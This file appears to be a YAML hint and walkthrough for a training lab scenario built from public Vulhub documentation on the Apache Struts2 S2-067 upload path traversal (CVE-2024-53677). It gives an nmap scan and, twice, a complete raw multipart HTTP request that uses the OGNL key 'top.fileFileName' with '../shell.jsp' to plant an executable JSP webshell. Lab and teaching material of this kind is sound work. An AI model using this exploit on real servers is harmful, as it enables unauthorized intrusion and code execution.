# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
schema_version: 1
match: struts2/s2-067
cve: CVE-2024-53677
hint_levels:
  low:
  - Inspect the struts2 service or application on {{NODE_NAME}} @ {{NODE_IP}}.
  medium:
  - |-
    Catalog TCP ports: 5005,8080. Identify the exposed services:

    ```bash
    nmap -Pn -sT -sV -p 5005,8080 {{NODE_IP}}
    ```
  - 'Catalog port mappings (published → container): struts2: 8080/tcp → container 8080/tcp; struts2: 5005/tcp →
    container 5005/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.'
  - 'Documented target URL(s): `http://{{NODE_IP}}:8080`, `http://{{NODE_IP}}:8080/shell.jsp`.'
  high:
  - |-
    Vulnerability: Struts2 S2-067 Upload Path Traversal (CVE-2024-53677).

    CVE record(s): https://www.cve.org/CVERecord?id=CVE-2024-53677
  - Send the raw request examples with an HTTP client that recalculates Content-Length after target and payload
    substitutions.
  - |-
    Vulnerability Reproduce

    Before reproducing the S2-067 vulnerability, you need to read the S2-066: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-067/../s2-066/README.md first and understand the principle of the vulnerability.

    On this server, you cannot use the same payload as in S2-066, because the case sensitivity issue has been fixed.

    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-067/1.png

    Use OGNL expression `top.fileFileName` in the parameter key of filename, then the file will be uploaded to outside the `upload/` directory again:

    ```
    POST /index.action HTTP/1.1
    Host: {{NODE_IP}}:8080
    Accept-Encoding: gzip, deflate, br
    Accept: */*
    Accept-Language: en-US;q=0.9,en;q=0.8
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
    Connection: close
    Cache-Control: max-age=0
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl6ZFZPznNSPZOFJF

    ------WebKitFormBoundaryl6ZFZPznNSPZOFJF
    Content-Disposition: form-data; name="file"; filename="shell.jsp"
    Content-Type: text/plain

    <%
      out.println("hello world");
    %>
    ------WebKitFormBoundaryl6ZFZPznNSPZOFJF
    Content-Disposition: form-data; name="top.fileFileName"

    ../shell.jsp
    ------WebKitFormBoundaryl6ZFZPznNSPZOFJF--
    ```

    Note the key elements in the exploit:

    - Instead of using case sensitivity like in S2-066, we use OGNL expression evaluation in the parameter key
    - The parameter key `top.fileFileName` is evaluated as an OGNL expression
    - This evaluation allows us to override the filename with the path traversal payload `../shell.jsp`

    Successful Upload: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-067/2.png

    The JSP file is now uploaded outside the restricted upload directory and can be executed:

    Webshell Execution: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-067/3.png

    You can now access the webshell at `http://{{NODE_IP}}:8080/shell.jsp`.
  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-067/README.md'
  - |-
    Additional public references:
    - https://cwiki.apache.org/confluence/display/WW/s2-067
    - https://y4tacker.github.io/2024/12/16/year/2024/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E7%BB%95%E8%BF%87-CVE-2024-53677-S2-067/
access_instructions:
  title: Struts2 S2-067 Upload Path Traversal (CVE-2024-53677)
  steps:
  - title: Locate the target service
    instructions: |-
      Catalog TCP ports: 5005,8080. Identify the exposed services:

      ```bash
      nmap -Pn -sT -sV -p 5005,8080 {{NODE_IP}}
      ```

      Catalog port mappings (published → container): struts2: 8080/tcp → container 8080/tcp; struts2: 5005/tcp → container 5005/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.

      Documented target URL(s): `http://{{NODE_IP}}:8080`, `http://{{NODE_IP}}:8080/shell.jsp`.
  - title: Vulnerability Reproduce
    instructions: |-
      Before reproducing the S2-067 vulnerability, you need to read the S2-066: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-067/../s2-066/README.md first and understand the principle of the vulnerability.

      On this server, you cannot use the same payload as in S2-066, because the case sensitivity issue has been fixed.

      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-067/1.png

      Use OGNL expression `top.fileFileName` in the parameter key of filename, then the file will be uploaded to outside the `upload/` directory again:

      ```
      POST /index.action HTTP/1.1
      Host: {{NODE_IP}}:8080
      Accept-Encoding: gzip, deflate, br
      Accept: */*
      Accept-Language: en-US;q=0.9,en;q=0.8
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
      Connection: close
      Cache-Control: max-age=0
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl6ZFZPznNSPZOFJF

      ------WebKitFormBoundaryl6ZFZPznNSPZOFJF
      Content-Disposition: form-data; name="file"; filename="shell.jsp"
      Content-Type: text/plain

      <%
        out.println("hello world");
      %>
      ------WebKitFormBoundaryl6ZFZPznNSPZOFJF
      Content-Disposition: form-data; name="top.fileFileName"

      ../shell.jsp
      ------WebKitFormBoundaryl6ZFZPznNSPZOFJF--
      ```

      Note the key elements in the exploit:

      - Instead of using case sensitivity like in S2-066, we use OGNL expression evaluation in the parameter key
      - The parameter key `top.fileFileName` is evaluated as an OGNL expression
      - This evaluation allows us to override the filename with the path traversal payload `../shell.jsp`

      Successful Upload: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-067/2.png

      The JSP file is now uploaded outside the restricted upload directory and can be executed:

      Webshell Execution: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-067/3.png

      You can now access the webshell at `http://{{NODE_IP}}:8080/shell.jsp`.
